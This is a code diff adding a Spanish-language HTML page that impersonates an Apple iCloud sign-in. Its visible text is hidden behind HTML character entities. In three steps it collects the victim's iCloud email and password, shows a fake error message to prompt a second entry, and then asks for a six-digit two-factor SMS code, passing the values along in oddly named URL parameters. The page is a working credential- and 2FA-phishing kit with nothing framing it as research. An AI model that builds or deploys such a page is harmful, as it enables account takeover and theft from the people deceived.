@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+    <title>&#105;&#67;&#108;&#111;&#117;&#100;</title>
+    <style>
+      .content { display: none; }
+      .error-message {
+        color: red;
+        font-size: 1em;
+        margin-top: 10px;
+      }
+    </style>
+    <script>
+      function getParameterByName(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+      }
+
+      function showContentByParameter() {
+        const contentParam = getParameterByName("content"); // &#79;&#98;&#116;&#101;&#110;&#101;&#114; &#101;&#108; &#112;&#97;&#114;&#225;&#109;&#101;&#116;&#114;&#111; &#39;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#39;
+        
+        document.getElementById("content1").style.display = "none";
+        document.getElementById("content2").style.display = "none";
+        document.getElementById("content3").style.display = "none";
+
+        if (contentParam === "1") {
+          document.getElementById("content1").style.display = "block";
+        } else if (contentParam === "2") {
+          document.getElementById("content2").style.display = "block";
+        } else if (contentParam === "3") {
+          var equisParam = getParameterByName("equis");
+          document.getElementById("email-code-param").value = equisParam;
+          document.getElementById("content3").style.display = "block";
+        }
+      }
+
+      window.onload = showContentByParameter;
+    </script>
+  </head>
+  <body>
+    <div id="content1" class="login-container content">
+      <form action="" method="GET">
+        <img src="foto.png" alt="&#76;&#111;&#103;&#111; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;">
+        <h1>&#67;&#111;&#110;&#116;&#105;&#110;&#250;&#97; &#99;&#111;&#110; &#117;&#110;&#97; &#99;&#117;&#101;&#110;&#116;&#97; &#100;&#101; &#65;&#112;&#112;&#108;&#101;</h1>
+        <p>&#80;&#97;&#114;&#97; &#97;&#99;&#99;&#101;&#100;&#101;&#114; &#97; &#101;&#115;&#116;&#101; &#225;&#108;&#98;&#117;&#109; &#100;&#101;&#98;&#101;&#109;&#111;&#115; &#99;&#111;&#109;&#112;&#114;&#111;&#98;&#97;&#114; &#116;&#117; &#105;&#100;&#101;&#110;&#116;&#105;&#100;&#97;&#100;.</p>
+        <div class="form-group">
+          <input name="equis" type="email" id="apple-id-1" placeholder=" " required>
+          <label for="apple-id">&#69;&#109;&#97;&#105;&#108; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;</label>
+          <button class="arrow-button" onclick="showPasswordInput1()">&#x2192;</button>
+        </div>
+        <div class="form-group" id="password-group" style="display:none;">
+          <input name="equis" type="hidden" id="apple-id-aux" placeholder=" ">
+          <input name="ye" type="password" id="password" placeholder=" " required>
+          <input name="content" type="hidden" value="2">
+          <label for="password">&#67;&#111;&#110;&#116;&#114;&#97;&#115;&#101;&#241;&#97;</label>
+        </div>
+        <button class="login-button" type="submit">&#73;&#110;&#105;&#99;&#105;&#97;&#114; &#83;&#101;&#115;&#105;&#243;&#110;</button>
+        <a href="https://iforgot.apple.com/password/verify/appleid" class="forgot-password">&#191;&#79;&#108;&#118;&#105;&#100;&#97;&#115;&#116;&#101; &#116;&#117; &#73;&#68; &#100;&#101; &#65;&#112;&#112;&#108;&#101; &#111; &#99;&#111;&#110;&#116;&#114;&#97;&#115;&#101;&#241;&#97;&#63;</a>
+      </form>
+    </div>
+
+    <div id="content2" class="login-container content">
+      <form action="" method="GET">
+        <img src="foto.png" alt="&#76;&#111;&#103;&#111; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;">
+        <h1>&#67;&#111;&#110;&#116;&#105;&#110;&#250;&#97; &#99;&#111;&#110; &#117;&#110;&#97; &#99;&#117;&#101;&#110;&#116;&#97; &#100;&#101; &#65;&#112;&#112;&#108;&#101;</h1>
+        <p>&#80;&#97;&#114;&#97; &#97;&#99;&#99;&#101;&#100;&#101;&#114; &#97; &#101;&#115;&#116;&#101; &#225;&#108;&#98;&#117;&#109; &#100;&#101;&#98;&#101;&#109;&#111;&#115; &#99;&#111;&#109;&#112;&#114;&#111;&#98;&#97;&#114; &#116;&#117; &#105;&#100;&#101;&#110;&#116;&#105;&#100;&#97;&#100;.</p>
+        <div class="form-group">
+          <input name="equis" type="email" id="apple-id-2" placeholder=" " required>
+          <label for="apple-id">&#69;&#109;&#97;&#105;&#108; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;</label>
+          <button class="arrow-button-1" onclick="showPasswordInput2()">&#x2192;</button>
+        </div>
+        <div class="form-group" id="password-group-1" style="display:none;">
+          <input name="equis" type="hidden" id="apple-id-aux-1" placeholder=" ">
+          <input name="ye" type="password" id="password-1" placeholder=" " required>
+          <input type="hidden" name="content" value="3">
+          <label for="password">&#67;&#111;&#110;&#116;&#114;&#97;&#115;&#101;&#241;&#97;</label>
+        </div>
+        <button class="login-button-1" type="submit">&#73;&#110;&#105;&#99;&#105;&#97;&#114; &#83;&#101;&#115;&#105;&#243;&#110;</button>
+        <a href="https://iforgot.apple.com/password/verify/appleid" class="forgot-password">&#191;&#79;&#108;&#118;&#105;&#100;&#97;&#115;&#116;&#101; &#116;&#117; &#73;&#68; &#100;&#101; &#65;&#112;&#112;&#108;&#101; &#111; &#99;&#111;&#110;&#116;&#114;&#97;&#115;&#101;&#241;&#97;&#63;</a>
+        <p class="error-message">&#85;&#115;&#117;&#97;&#114;&#105;&#111; &#111; &#99;&#111;&#110;&#116;&#114;&#97;&#115;&#101;&#241;&#97; &#105;&#110;&#97;&#99;&#116;&#105;&#118;&#111;. &#65;&#115;&#105;&#115;&#116;&#101;&#110;&#99;&#105;&#97; &#114;&#101;&#113;&#117;&#101;&#114;&#105;&#100;&#97;</p>
+      </form>
+    </div>
+    <div id="content3" class="login-container content">
+      <form action="" method="GET" id="verification-form">
+          <img src="foto.png" alt="&#76;&#111;&#103;&#111; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;">
+          <h1>&#65;&#117;&#116;&#101;&#110;&#116;&#105;&#99;&#97;&#99;&#105;&#243;&#110; &#100;&#101; &#100;&#111;&#115; &#102;&#97;&#99;&#116;&#111;&#114;&#101;&#115;</h1>
+          
+          <div class="verification-code">
+              <input type="text" maxlength="1" class="code-input" required>
+              <input type="text" maxlength="1" class="code-input" required>
+              <input type="text" maxlength="1" class="code-input" required>
+              <input type="text" maxlength="1" class="code-input" required>
+              <input type="text" maxlength="1" class="code-input" required>
+              <input type="text" maxlength="1" class="code-input" required>
+          </div>
+  
+          <p>Se ha enviado un mensaje de texto con un có&#100;&#105;&#103;&#111;&#32;&#100;&#101;&#32;&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#99;ión a su número <strong>3&#42;&#42; &#42;&#42;&#42; &#42;&#42;&#42;&#42;</strong>. Introduzca el código para continuar.</p>
+      
+          <!-- Input oculto para enviar el código completo -->
+          <input type="hidden" name="equis" id="email-code-param" value="">
+          <input type="hidden" name="content" value="4">
+          <input type="hidden" name="equis" id="verification_code" value="">
+      
+          <button class="login-button-2" type="submit">&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#97;&#114;</button>
+      </form>
+  </div>
+  
+  </body>
+</html>
